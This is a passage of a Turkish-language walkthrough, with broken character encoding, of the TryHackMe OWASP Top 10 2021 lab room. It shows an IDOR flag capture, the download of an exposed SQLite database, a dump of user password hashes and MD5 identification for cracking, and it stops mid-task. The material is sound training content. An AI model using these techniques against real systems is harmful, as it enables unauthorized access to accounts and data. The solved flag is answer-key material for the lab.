---
title: OWASP Top 10 2021 TryHackMe (TÃ¼rkÃ§e)
published: 2025-02-24
updated: 2025-02-24
description: 'A comprehensive Turkish walkthrough guide for the OWASP Top 10 2021 room on TryHackMe, covering web application security vulnerabilities'
image: 'https://i.ibb.co/mrQzk12N/OWASP-Top10-2021-cover.png'
tags: [Linux, CTF, OWASP, Tutorial, Walkthrough]
category: 'Tutorial'
draft: false
---

## OWASP Top 10 Nedir?

OWASP Top 10, web uygulamalarÄ±nda en yaygÄ±n ve kritik gÃ¼venlik aÃ§Ä±klarÄ±nÄ± belirleyen bir rehberdir. Bu liste, gÃ¼venlik uzmanlarÄ± ve geliÅŸtiriciler iÃ§in Ã¶nemli bir referans kaynaÄŸÄ±dÄ±r.

### 1. Broken Access Control (KÄ±rÄ±k EriÅŸim KontrolÃ¼)
- **Ã–rnek:** Yetkisiz kullanÄ±cÄ±larÄ±n yÃ¶netici sayfalarÄ±na eriÅŸebilmesi.

### 2. Cryptographic Failures (Kriptografik Hatalar)
- **Ã–rnek:** Hassas verilerin ÅŸifrelenmeden saklanmasÄ±.

### 3. Injection (Enjeksiyon)
- **Ã–rnek:** SQL enjeksiyonu ile veritabanÄ±na yetkisiz eriÅŸim saÄŸlanmasÄ±.

### 4. Insecure Design (GÃ¼vensiz TasarÄ±m)
- **Ã–rnek:** Åifre sÄ±fÄ±rlama mekanizmasÄ±nda zayÄ±f doÄŸrulama yÃ¶ntemleri kullanÄ±lmasÄ±.

### 5. Security Misconfiguration (GÃ¼venlik YapÄ±landÄ±rma HatalarÄ±)
- **Ã–rnek:** VarsayÄ±lan kimlik bilgileriyle bÄ±rakÄ±lan yÃ¶netici hesaplarÄ±.

### 6. Vulnerable and Outdated Components (GÃ¼venlik AÃ§Ä±ÄŸÄ± Olan ve GÃ¼ncellenmemiÅŸ BileÅŸenler)
- **Ã–rnek:** Eski bir yazÄ±lÄ±m sÃ¼rÃ¼mÃ¼ndeki bilinen bir gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n istismar edilmesi.

### 7. Identification and Authentication Failures (Kimlik DoÄŸrulama ve TanÄ±mlama HatalarÄ±)
- **Ã–rnek:** ZayÄ±f parola politikalarÄ± ve Ã§ok faktÃ¶rlÃ¼ kimlik doÄŸrulamanÄ±n olmamasÄ±.

### 8. Software and Data Integrity Failures (YazÄ±lÄ±m ve Veri BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ HatalarÄ±)
- **Ã–rnek:** ÃœÃ§Ã¼ncÃ¼ taraf kÃ¼tÃ¼phanelerin bÃ¼tÃ¼nlÃ¼k kontrolÃ¼ yapÄ±lmadan kullanÄ±lmasÄ±.

### 9. Security Logging and Monitoring Failures (GÃ¼venlik KayÄ±tlarÄ± ve Ä°zleme HatalarÄ±)
- **Ã–rnek:** ÅÃ¼pheli etkinliklerin izlenmemesi ve kayÄ±tlarÄ±n tutulmamasÄ±.

### 10. Server-Side Request Forgery (SSRF) (Sunucu TaraflÄ± Ä°stek SahteciliÄŸi)
- **Ã–rnek:** SaldÄ±rganÄ±n sunucu Ã¼zerinden yetkisiz istekler yapabilmesi.

## GÃ¶rev 1: GiriÅŸ

![owasp logo](https://i.ibb.co/93Tr3Dsk/owasp10-logo.png)

Bu oda, her bir OWASP konusunu ayrÄ±ntÄ±lÄ± bir ÅŸekilde ele alÄ±r ve gÃ¼venlik aÃ§Ä±klarÄ±, bunlarÄ±n nasÄ±l ortaya Ã§Ä±ktÄ±ÄŸÄ± ve nasÄ±l istismar edilebileceÄŸi hakkÄ±nda bilgiler iÃ§erir. Teoriyi pratiÄŸe dÃ¶kmeniz iÃ§in destekleyici meydan okumalarÄ± tamamlayarak Ã¶ÄŸrendiklerinizi uygulayacaksÄ±nÄ±z.  

- KÄ±rÄ±k EriÅŸim KontrolÃ¼ (Broken Access Control)  
- Kriptografik Hatalar (Cryptographic Failures)  
- Enjeksiyon (Injection)  
- GÃ¼vensiz TasarÄ±m (Insecure Design)  
- GÃ¼venlik YapÄ±landÄ±rma HatalarÄ± (Security Misconfiguration)  
- GÃ¼venli Olmayan ve GÃ¼ncellenmemiÅŸ BileÅŸenler (Vulnerable and Outdated Components)  
- Kimlik DoÄŸrulama ve TanÄ±mlama HatalarÄ± (Identification and Authentication Failures)  
- YazÄ±lÄ±m ve Veri BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ HatalarÄ± (Software and Data Integrity Failures)  
- GÃ¼venlik GÃ¼nlÃ¼ÄŸÃ¼ ve Ä°zleme HatalarÄ± (Security Logging & Monitoring Failures)  
- Sunucu TaraflÄ± Ä°stek SahtekarlÄ±ÄŸÄ± (Server-Side Request Forgery - SSRF)  

Bu oda, acemiler iÃ§in tasarlanmÄ±ÅŸtÄ±r ve Ã¶nceki gÃ¼venlik bilgisi gerektirmez.

## GÃ¶rev 2: Makinalara EriÅŸim

![tryhackme-connect](https://i.ibb.co/99RWtF4b/tryhackme-connect.png)

BazÄ± gÃ¶revlerde, sanal bir makineyi hackleyerek Ã¶ÄŸrenme deneyimi yaÅŸayacaksÄ±nÄ±z. Ã–ncelikle [odaya gidin](https://tryhackme.com/room/owasptop102021) ve yeÅŸil **"Start Machine"** dÃ¼ÄŸmesine basarak Sanal Makineyi baÅŸlatÄ±n.  

Bu makinelere eriÅŸmek iÃ§in aÅŸaÄŸÄ±daki yÃ¶ntemlerden birini kullanabilirsiniz:  

- **OpenVPN kullanarak baÄŸlanma**  
    OpenVPN kullanarak baÄŸlanmak iÃ§in [buradaki](https://tryhackme.com/access) kÄ±lavuzu takip edin.

- **TarayÄ±cÄ± iÃ§i Linux Makinesi kullanma**  
    AboneliÄŸiniz varsa, tarayÄ±cÄ± iÃ§inden **AttackBox**'Ä± daÄŸÄ±tarak eriÅŸebilirsiniz!

OpenVPN kullanarak baÄŸlanalÄ±m:

- VPN dosyasÄ±nÄ± indirmek iÃ§in [buraya](https://tryhackme.com/access) gidin ve indirin:

    ![download-configuration](https://i.ibb.co/KcPBg4Wq/download-configuration.png)

- Bu Ã¶rnekteki gibi baÄŸlantÄ±yÄ± saÄŸlayÄ±n (root yetkileri ile):
    
    Komut: `openvpn fr0stb1rd.ovpn`

    ![vpn connect](https://i.ibb.co/Y7QmpYqL/vpn-connect.png)

## GÃ¶rev 3: ğŸ›‘ Broken Access Control

![kilitler](https://i.ibb.co/4g2QYSwn/kilitler-1.png)

#### EriÅŸim KontrolÃ¼ Nedir?
Web siteleri, belirli sayfalarÄ± yalnÄ±zca yetkili kullanÄ±cÄ±larÄ±n eriÅŸebileceÄŸi ÅŸekilde sÄ±nÄ±rlar.  Ã–rneÄŸin, bir **site yÃ¶neticisinin** diÄŸer kullanÄ±cÄ±larÄ± yÃ¶netmek iÃ§in belirli bir sayfaya eriÅŸebilmesi gerekir. Ancak, eÄŸer bir ziyaretÃ§i yetkisi olmadan bu korunan sayfalara eriÅŸebiliyorsa, **eriÅŸim kontrolleri kÄ±rÄ±lmÄ±ÅŸtÄ±r**.

#### KÄ±rÄ±k EriÅŸim KontrolÃ¼nÃ¼n SonuÃ§larÄ±
Bir saldÄ±rganÄ±n yetkisi olmadan korunan sayfalara eriÅŸebilmesi ÅŸu risklere yol aÃ§abilir:

- Hassas kullanÄ±cÄ± bilgilerini gÃ¶rebilir.  
- Yetkisiz iÅŸlevleri kullanabilir.  
- YÃ¶netici paneline eriÅŸerek sistemde deÄŸiÅŸiklik yapabilir.  
- DiÄŸer kullanÄ±cÄ± hesaplarÄ±nÄ± deÄŸiÅŸtirebilir veya silebilir.  

#### KÄ±rÄ±k EriÅŸim KontrolÃ¼ NasÄ±l Ä°stismar Edilir?
- **Yetkisiz URL eriÅŸimi:** Admin paneli gibi sayfalara doÄŸrudan URL Ã¼zerinden eriÅŸmeye Ã§alÄ±ÅŸarak test edilebilir.  
- **ID deÄŸiÅŸtirme (IDOR - Insecure Direct Object References):** KullanÄ±cÄ± kimlikleri veya nesne IDâ€™leri deÄŸiÅŸtirilerek farklÄ± hesaplara veya verilere eriÅŸim denenebilir.  
- **Yetersiz yetkilendirme kontrolleri:** API Ã§aÄŸrÄ±larÄ± ve HTTP istekleri manipÃ¼le edilerek test edilebilir.  

#### GerÃ§ek DÃ¼nya Ã–rneÄŸi: YouTube Ã–zel Videolar AÃ§Ä±ÄŸÄ± (2019)
2019 yÄ±lÄ±nda, [YouTube'da bir gÃ¼venlik aÃ§Ä±ÄŸÄ± keÅŸfedildi](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/). Bu aÃ§Ä±k sayesinde, saldÄ±rganlar **Ã¶zel (private) olarak iÅŸaretlenmiÅŸ videolarÄ±n** herhangi bir karesine eriÅŸebiliyordu.

- GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ±, YouTubeâ€™un sistemine ardÄ±ÅŸÄ±k istekler gÃ¶ndererek, videonun farklÄ± karelerine eriÅŸmeyi baÅŸardÄ±.  
- Yeterli sayÄ±da kare toplandÄ±ÄŸÄ±nda, **videonun bir kÄ±smÄ±nÄ± yeniden oluÅŸturmak mÃ¼mkÃ¼n hale geldi**.  
- KullanÄ±cÄ±lar bir videoyu **"Ã¶zel" olarak iÅŸaretlediÄŸinde, kimsenin ona eriÅŸemeyeceÄŸini dÃ¼ÅŸÃ¼nÃ¼r**. Ancak bu aÃ§Ä±k nedeniyle, video iÃ§erikleri sÄ±zdÄ±rÄ±labiliyordu.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, **kÄ±rÄ±k eriÅŸim kontrolÃ¼ne** klasik bir Ã¶rnektir. KullanÄ±cÄ±larÄ±n Ã¶zel videolarÄ±nÄ±n gerÃ§ekten Ã¶zel olduÄŸuna inanmasÄ± gerekirken, sistemdeki hata nedeniyle bu gÃ¼venlik vaadi ihlal edilmiÅŸtir.

## GÃ¶rev 4: KÄ±rÄ±k EriÅŸim KontrolÃ¼ (IDOR Ã‡Ã¶zÃ¼m Rehberi)

### IDOR Nedir?
IDOR (**Insecure Direct Object Reference - GÃ¼vensiz DoÄŸrudan Nesne ReferansÄ±**), bir eriÅŸim kontrol aÃ§Ä±ÄŸÄ±dÄ±r.  
Bu aÃ§Ä±k sayesinde, saldÄ±rganlar normalde eriÅŸemeyecekleri kaynaklara ulaÅŸabilir.  

Bu durum, bir programcÄ±nÄ±n **DoÄŸrudan Nesne ReferansÄ±**nÄ± (Direct Object Reference) aÃ§Ä±ÄŸa Ã§Ä±karmasÄ± nedeniyle oluÅŸur.  
Bu nesneler ÅŸunlar olabilir:
- Bir dosya  
- Bir kullanÄ±cÄ± hesabÄ±  
- Bir banka hesabÄ±  
- Sistemdeki herhangi bir veri  

### IDOR NasÄ±l Ã‡alÄ±ÅŸÄ±r?

Ã–rnek bir senaryoya bakalÄ±m:  

1. Bir bankacÄ±lÄ±k uygulamasÄ±na giriÅŸ yaptÄ±ÄŸÄ±mÄ±zÄ± dÃ¼ÅŸÃ¼nelim.  
2. Kimlik doÄŸrulama baÅŸarÄ±lÄ± olduktan sonra ÅŸu URL'ye yÃ¶nlendirildiÄŸimizi varsayalÄ±m:  
   ```
   https://bank.thm/account?id=111111
   ```
   ![idor 1](https://i.ibb.co/DPGfF2Lx/idor1-1.png)
3. Bu sayfada, kendi banka bilgilerimizi gÃ¶rebiliriz.
4. Ancak, burada bÃ¼yÃ¼k bir gÃ¼venlik aÃ§Ä±ÄŸÄ± olabilir.  
5. SaldÄ±rgan, **id** parametresini deÄŸiÅŸtirerek farklÄ± bir kullanÄ±cÄ±ya ait verilere eriÅŸmeye Ã§alÄ±ÅŸabilir:  
    ```
    https://bank.thm/account?id=222222
    ```
    ![idor 2](https://i.ibb.co/60V4VSzw/idor2-1.png)

EÄŸer sistem dÃ¼zgÃ¼n yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, saldÄ±rgan bu URL'yi kullanarak **baÅŸka birinin banka bilgilerine eriÅŸebilir**.

### IDOR AÃ§Ä±ÄŸÄ±nÄ±n Sebebi
- **UygulamanÄ±n doÄŸrudan nesne referanslarÄ±nÄ± (Ã¶rneÄŸin, id deÄŸerlerini) kontrol etmemesi**  
- **KullanÄ±cÄ±nÄ±n yalnÄ±zca kendi hesabÄ±na eriÅŸtiÄŸini doÄŸrulamamasÄ±**  

DoÄŸrudan nesne referanslarÄ± tek baÅŸÄ±na bir gÃ¼venlik aÃ§Ä±ÄŸÄ± deÄŸildir. Ancak, **uygulama kimlik doÄŸrulama ve yetkilendirme kontrollerini dÃ¼zgÃ¼n yapmazsa**, saldÄ±rganlar bu aÃ§Ä±ÄŸÄ± istismar edebilir.

**IDOR, hassas verilere yetkisiz eriÅŸime neden olabilecek ciddi bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r.**  
Bu yÃ¼zden, sistemlerin her istekte **kullanÄ±cÄ±nÄ±n gerÃ§ekten ilgili kaynaÄŸa eriÅŸme izni olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamasÄ± gerekir.**

- MakinayÄ± baÅŸlatÄ±p "noot" ve "test1234" olarak giriÅŸ yapalÄ±m:

    ![noot test1234](https://i.ibb.co/XrzqJyM8/noot-test1234.png)

- Bizi bir not karÅŸÄ±lÄ±yor:

    ![mesaj](https://i.ibb.co/kj9h8jG/mesaj.png)

- URL'deki id deÄŸerini 0 olarak deÄŸiÅŸtirerek baÅŸkalarÄ±nÄ±n mesajÄ±nÄ± okumaya Ã§alÄ±ÅŸalÄ±m:

    ![mesaj 0](https://i.ibb.co/604Cr4ck/mesaj0.png)

    BayraÄŸÄ± yakaladÄ±k: `flag{fivefourthree}`

## GÃ¶rev 5: ğŸ›‘ Cryptographic Failures

### Kriptografik Hata Nedir?
Kriptografik hata, hassas bilgileri korumak iÃ§in kullanÄ±lan **ÅŸifreleme algoritmalarÄ±nÄ±n yanlÄ±ÅŸ kullanÄ±mÄ±** veya **hiÃ§ kullanÄ±lmamasÄ±** nedeniyle ortaya Ã§Ä±kan gÃ¼venlik aÃ§Ä±klarÄ±nÄ± ifade eder.  
Web uygulamalarÄ±, kullanÄ±cÄ± verilerinin gizliliÄŸini saÄŸlamak iÃ§in **kriptografiye** ihtiyaÃ§ duyar.  

### Åifrelemenin Ã–nemi  
GÃ¼venli bir e-posta uygulamasÄ±nÄ± ele alalÄ±m:  

- **Veri aktarÄ±mÄ± sÄ±rasÄ±nda ÅŸifreleme (Data in Transit Encryption):**  
  - TarayÄ±cÄ± Ã¼zerinden e-posta hesabÄ±nÄ±za eriÅŸtiÄŸinizde, istemci (siz) ile sunucu arasÄ±ndaki iletiÅŸimin **ÅŸifrelenmiÅŸ** olmasÄ± gerekir.  
  - Bu, aÄŸ trafiÄŸini dinleyen bir saldÄ±rganÄ±n, veri paketlerinden **e-posta iÃ§eriklerinizi gÃ¶rememesini** saÄŸlar.  

- **Veri saklama sÄ±rasÄ±nda ÅŸifreleme (Data at Rest Encryption):**  
  - E-postalarÄ±nÄ±z bir sunucuda saklanÄ±rken, **hizmet saÄŸlayÄ±cÄ±nÄ±n bile bu e-postalarÄ± okuyamamasÄ± iÃ§in** ÅŸifrelenmiÅŸ olmasÄ± gerekir.  

### Kriptografik HatalarÄ±n SonuÃ§larÄ±  
Web uygulamalarÄ±nda **kriptografik hatalar**, genellikle hassas bilgilerin yanlÄ±ÅŸlÄ±kla aÃ§Ä±ÄŸa Ã§Ä±kmasÄ±na neden olur.  
Bu bilgiler ÅŸunlar olabilir:  

- MÃ¼ÅŸteri bilgileri (isim, doÄŸum tarihi, finansal bilgiler)  
- Teknik bilgiler (kullanÄ±cÄ± adlarÄ±, ÅŸifreler, API anahtarlarÄ±)  

### Kriptografik HatalarÄ±n Ä°stismarÄ±  
- **Man-in-the-Middle (MITM) saldÄ±rÄ±larÄ±:**  
  - SaldÄ±rgan, kullanÄ±cÄ± baÄŸlantÄ±larÄ±nÄ± **kontrol ettiÄŸi bir cihaza yÃ¶nlendirerek** verileri ele geÃ§irebilir.  
  - EÄŸer **zayÄ±f bir ÅŸifreleme** kullanÄ±lÄ±yorsa, saldÄ±rgan bu verileri okuyabilir.  

- **ÅifrelenmemiÅŸ hassas verilerin web sunucusunda saklanmasÄ±:**  
  - GeliÅŸmiÅŸ aÄŸ bilgisi olmadan bile **bazÄ± hassas veriler doÄŸrudan sunucuda bulunabilir**.  
  - UygulamanÄ±n yapÄ±landÄ±rma dosyalarÄ±nda veya loglarÄ±nda aÃ§Ä±k olarak saklanan ÅŸifreler ciddi bir gÃ¼venlik riski oluÅŸturur.  

Bu kutudaki web uygulamasÄ±, **bu tÃ¼r bir gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± iÃ§ermektedir**. Devam etmek iÃ§in sonraki gÃ¶revlerde verilen destekleyici materyalleri okuyun.

## GÃ¶rev 6: Kriptografik Hatalar (Destekleyici Materyal 1)

### 1. VeritabanlarÄ± ve Web UygulamalarÄ±  
- Web uygulamalarÄ±, bÃ¼yÃ¼k miktarda veriyi saklamak iÃ§in **veritabanlarÄ±** kullanÄ±r.  
- VeritabanlarÄ± genellikle **SQL (Structured Query Language)** ile yÃ¶netilir.  
- BÃ¼yÃ¼k Ã¶lÃ§ekli uygulamalarda **MySQL**, **MariaDB** gibi veritabanÄ± sunucularÄ± kullanÄ±lÄ±r.  

### 2. DÃ¼z Dosya (Flat-File) VeritabanlarÄ± Nedir?  
- **DÃ¼z dosya veritabanlarÄ±**, **diskte tek bir dosya** olarak saklanÄ±r.  
- **KÃ¼Ã§Ã¼k Ã¶lÃ§ekli web uygulamalarÄ±nda** baÄŸÄ±msÄ±z bir veritabanÄ± sunucusu yerine tercih edilebilir.  
- **Web kÃ¶k dizini iÃ§inde saklanÄ±rsa**, saldÄ±rganlar tarafÄ±ndan **indirilebilir ve analiz edilebilir**.  

### 3. SQLite VeritabanlarÄ±nÄ± Kullanma  

#### 3.1. SQLite veritabanÄ±nÄ± bulma  
- Bir saldÄ±rganÄ±n bir SQLite veritabanÄ±nÄ± indirdiÄŸini varsayalÄ±m:  

  ```bash
  ls -l
  ```
  **Ã‡Ä±ktÄ±:**
  ```
  -rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
  ```

- DosyanÄ±n bir SQLite veritabanÄ± olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in:  

  ```bash
  file example.db
  ```
  **Ã‡Ä±ktÄ±:**
  ```
  example.db: SQLite 3.x database, last written using SQLite version 3039002
  ```

#### 3.2. SQLite veritabanÄ±nÄ± aÃ§ma  
- SQLite veritabanÄ±na eriÅŸmek iÃ§in:  

  ```bash
  sqlite3 example.db
  ```
  **Ã‡Ä±ktÄ±:**
  ```
  SQLite version 3.39.2
  Enter ".help" for usage hints.
  sqlite>
  ```

#### 3.3. VeritabanÄ±ndaki tablolarÄ± listeleme  
- **Mevcut tablolarÄ± gÃ¶rmek iÃ§in:**  

  ```sql
  .tables
  ```
  **Ã‡Ä±ktÄ±:**  
  ```
  customers
  ```

#### 3.4. Tablo yapÄ±sÄ±nÄ± inceleme  
- **Bir tablodaki sÃ¼tunlarÄ± gÃ¶rmek iÃ§in:**  

  ```sql
  PRAGMA table_info(customers);
  ```
  **Ã‡Ä±ktÄ±:**  
  ```
  0|custID|INT|1||1
  1|custName|TEXT|1||0
  2|creditCard|TEXT|0||0
  3|password|TEXT|1||0
  ```

#### 3.5. Tablodaki verileri listeleme  
- **MÃ¼ÅŸteri verilerini gÃ¶rmek iÃ§in:**  

  ```sql
  SELECT * FROM customers;
  ```
  **Ã‡Ä±ktÄ±:**  
  ```
  0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
  1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
  2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
  ```

#### 3.6. Ã–rnek Veri AÃ§Ä±klamasÄ±  
- Ä°lk satÄ±rda bulunan bilgiler:  
  - **custID:** `0`  
  - **custName:** `Joy Paulson`  
  - **creditCard:** `4916 9012 2231 7905`  
  - **password (hashlenmiÅŸ):** `5f4dcc3b5aa765d61d8327deb882cf99`  

### 4. Sonraki AdÄ±m: Åifre KÄ±rma  
- Bir sonraki adÄ±mda, bu **hashlenmiÅŸ ÅŸifrelerin nasÄ±l kÄ±rÄ±labileceÄŸini** ele alacaÄŸÄ±z.

## GÃ¶rev 7: Kriptografik Hatalar (Destekleyici Materyal 2)

### Hash Nedir?  
- Hash, verilerin **tek yÃ¶nlÃ¼ ÅŸifrelenmiÅŸ** halidir.  
- Parolalar genellikle **hashlenerek** saklanÄ±r.  
- ZayÄ±f hash algoritmalarÄ± kullanÄ±ldÄ±ÄŸÄ±nda, saldÄ±rganlar parolalarÄ± kolayca kÄ±rabilir.  

### Hash KÄ±rma AraÃ§larÄ±  
- Kali Linux, **hash kÄ±rma** iÃ§in birÃ§ok Ã¶nceden yÃ¼klenmiÅŸ araÃ§ iÃ§erir.  
- Bu araÃ§lar bu dokÃ¼manÄ±n kapsamÄ± dÄ±ÅŸÄ±nda olduÄŸu iÃ§in **Ã§evrimiÃ§i** bir Ã§Ã¶zÃ¼m kullanÄ±lacaktÄ±r.  
- **CrackStation** gibi Ã§evrimiÃ§i araÃ§lar, yaygÄ±n parola hash'lerini kÄ±rmak iÃ§in **bÃ¼yÃ¼k kelime listeleri** kullanÄ±r.  

### CrackStation KullanÄ±mÄ±  
1. **CrackStation web sitesine** gidin: [https://crackstation.net/](https://crackstation.net/)  
2. **KÄ±rÄ±lmak istenen hash'i** kopyalayÄ±n.  
3. **Captcha'yÄ± Ã§Ã¶zÃ¼n** ve "Crack Hashes" dÃ¼ÄŸmesine basÄ±n.  

    ![CrackStation ArayÃ¼zÃ¼](https://i.ibb.co/G4Bnq5bR/cracksnation1.png)  

### Ã–rnek: ZayÄ±f Bir MD5 Hash'ini KÄ±rma  
- Ã–nceki gÃ¶revde elde edilen **Joy Paulson**'a ait hash:  

  ```
  5f4dcc3b5aa765d61d8327deb882cf99
  ```

- CrackStation kullanÄ±larak kÄ±rÄ±ldÄ±ÄŸÄ±nda **Ã§Ä±ktÄ±:**  

  ```
  password
  ```

    ![CrackStation Ã‡Ä±ktÄ±sÄ±](https://i.ibb.co/DgWb9mpm/cracksnation2.png)  

### Ã–nemli Notlar  
- CrackStation, yalnÄ±zca **kelime listesinde bulunan** hash'leri kÄ±rabilir.  
- GÃ¼Ã§lÃ¼ hash algoritmalarÄ± ve **tuzlama (salting)** kullanÄ±ldÄ±ÄŸÄ±nda, bu tÃ¼r saldÄ±rÄ±lar **baÅŸarÄ±sÄ±z** olur.  

## GÃ¶rev 8: Kriptografik Hatalar Ã‡Ã¶zÃ¼m Rehberi

### 8.1. Genel BakÄ±ÅŸ

- Siteyi biraz inceleyelim. Login kÄ±smÄ±na bakalÄ±m:

  ![](https://i.ibb.co/KpXZ5X90/8-1.png)

### 8.2. AÃ§Ä±k Yollar

- AÃ§Ä±k yollar (path) var mÄ± diye kaynaÄŸa bakalÄ±m:

  ![](https://i.ibb.co/DfjgM72w/8-2.png)

### 8.3. Assets Dizini

- Bu dizine gidelim: `view-source:http://10.10.234.251:81/assets/css`
  ![](https://i.ibb.co/rG3DNsHm/8-3.png)
- GÃ¶rÃ¼ldÃ¼ÄŸÃ¼ Ã¼zere filtreleme yapÄ±lmamÄ±ÅŸ ve dosyalarÄ±n listesini gÃ¶rebiliyoruz. Bunu gÃ¶remememiz lazÄ±mdÄ±.

### 8.4. Assets Dizini Ä°Ã§erikleri

- Ana dizinde ne olduÄŸuna bakalÄ±m:

  ![](https://i.ibb.co/dswpL6hR/8-4.png)

- Buradan db dosyasÄ±nÄ± indirelim.

### 8.5. webapp.db DosyasÄ±na BakÄ±ÅŸ

- Ä°ndirdiÄŸimiz db dosyasÄ±nÄ±n ne olduÄŸunu gÃ¶rmek iÃ§in file komutunu kullanalÄ±m:

  ```bash
  â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads]
  â””â”€$ file webapp.db                                                             
  webapp.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 255, database pages 7, 1st free page 5, free pages 1, cookie 0x6, schema 4, UTF-8, version-valid-for 255
  ```
- sqlite3 ile tablolarÄ± inceleyelim (`headers on` diyerek row isimlerini de gÃ¶rebiliriz.):

  ```bash
  â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads]
  â””â”€$ sqlite3 webapp.db 
  SQLite version 3.46.1 2024-08-13 09:16:08
  Enter ".help" for usage hints.
  sqlite> .databases
  main: /home/kali/Downloads/webapp.db r/w
  sqlite> .tables
  sessions  users   
  sqlite> select * from users;
  4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
  23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
  4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
  sqlite> .headers on
  sqlite> select * from users;
  userID|username|password|admin
  4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
  23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
  4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
  sqlite> 
  ```

  ![](https://i.ibb.co/VhHKF8b/8-5.png)

### 8.6 Hash DeÄŸerlerini TanÄ±mlayalÄ±m

- Elde ettiÄŸimiz hash deÄŸerinin ne olduÄŸunu henÃ¼z bilmiyouz. Bunu Ã¶ÄŸrenmemiz (tahmin etmemiz) iÃ§in bir araÃ§ var: `hash-identifier`

  ```bash
  â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads]
  â””â”€$ hash-identifier 6eea9b7ef19179a06954edd0f6c05ceb
    #########################################################################
    #     __  __                     __           ______    _____           #
    #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
    #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
    #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
    #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
    #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
    #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
    #                                                             By Zion3R #
    #                                                    www.Blackploit.com #
    #                                                   Root@Blackploit.com #
    #########################################################################
  --------------------------------------------------

  Possible Hashs:
  [+] MD5
  [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

  Least Possible Hashs:
  [+] RAdmin v2.x
  [+] NTLM
  [+] MD4
  [+] MD2
  [+] MD5(HMAC)
  [+] MD4(HMAC)
  [+] MD2(HMAC)
  [+] MD5(HMAC(Wordpress))
  [+] Haval-128
  [+] Haval-128(HMAC)
  [+] RipeMD-128
  [+] RipeMD-128(HMAC)
  [+] SNEFRU-128
  [+] SNEFRU-128(HMAC)
  [+] Tiger-128
  [+] Tiger-128(HMAC)
  [+] md5($pass.$salt)
  [+] md5($salt.$pass)
  [+] md5($salt.$pass.$salt)
  [+] md5($salt.$pass.$username)
  [+] md5($salt.md5($pass))
  [+] md5($salt.md5($pass))
  [+] md5($salt.md5($pass.$salt))
  [+] md5($salt.md5($pass.$salt))
  [+] md5($salt.md5($salt.$pass))
  [+] md5($salt.md5(md5($pass).$salt))
  [+] md5($username.0.$pass)
  [+] md5($username.LF.$pass)
  [+] md5($username.md5($pass).$salt)
  [+] md5(md5($pass))
  [+] md5(md5($pass).$salt)
  [+] md5(md5($pass).md5($salt))
  [+] md5(md5($salt).$pass)
  [+] md5(md5($salt).md5($pass))
  [+] md5(md5($username.$pass).$salt)
  [+] md5(md5(md5($pass)))
  [+] md5(md5(md5(md5($pass))))
  [+] md5(md5(md5(md5(md5($pass)))))
  [+] md5(sha1($pass))
  [+] md5(sha1(md5($pass)))
  [+] md5(sha1(md5(sha1($pass))))
  [+] md5(strtoupper(md5($pass)))
  --------------------------------------------------
  HASH: ^C

          Bye!
  ```

  ![](https://i.ibb.co/4wMnV4q9/8-6.png)

- Buradan hashlerimizin md5 olduÄŸunu anladÄ±k. KÄ±rmayÄ± deneyelim.

### 8.7 MD5 KÄ±rabilir Miyiz?

- MD5 geri dÃ¶ndÃ¼rÃ¼lemez bir hash fonksiyonudur, ancak bazÄ± projeler ve teknikler, Ã¶nceden hesaplanmÄ±ÅŸ hash deÄŸerlerini kullanarak geri dÃ¶ndÃ¼rmeye Ã§alÄ±ÅŸÄ±r. Bunlar ÅŸu ÅŸekilde Ã§alÄ±ÅŸÄ±r:  
  - **Rainbow Tables**: BÃ¼yÃ¼k veri tabanlarÄ±nda yaygÄ±n parolalarÄ±n MD5 hash karÅŸÄ±lÄ±klarÄ±nÄ± saklar. EÄŸer bir hash bu tabloda varsa, karÅŸÄ±lÄ±k gelen parola bulunabilir.  
  - **Brute Force**: Rastgele veya belirli bir parola listesinden Ã¼retilen hash deÄŸerleri ile karÅŸÄ±laÅŸtÄ±rma yaparak eÅŸleÅŸme arar.  
  - **Dictionary Attack**: YaygÄ±n kullanÄ±lan parolalarÄ± iÃ§eren bir sÃ¶zlÃ¼k kullanarak hash karÅŸÄ±laÅŸtÄ±rmasÄ± yapar.  

- Bu yÃ¶ntemlerle bazÄ± zayÄ±f veya yaygÄ±n parolalar Ã§Ã¶zÃ¼lebilir, ancak gÃ¼Ã§lÃ¼ ve rastgele oluÅŸturulmuÅŸ parolalar genellikle kÄ±rÄ±lamaz.

- `https://reversehash.glitch.me/` kullanabiliriz:

  ```bash
  â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads]
